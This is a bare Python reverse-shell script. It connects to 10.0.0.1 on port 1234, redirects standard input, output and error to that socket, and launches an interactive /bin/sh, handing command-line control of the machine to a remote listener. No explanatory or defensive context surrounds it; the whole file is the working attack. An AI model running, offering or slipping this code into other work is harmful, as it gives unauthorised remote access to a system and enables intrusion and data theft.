#!/usr/bin/python

import socket as sk
import subprocess as sp
import os

s = sk.socket(sk.AF_INET, sk.SOCK_STREAM)
s.connect(("10.0.0.1", 1234))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = sp.call(["/bin/sh", "-i"])
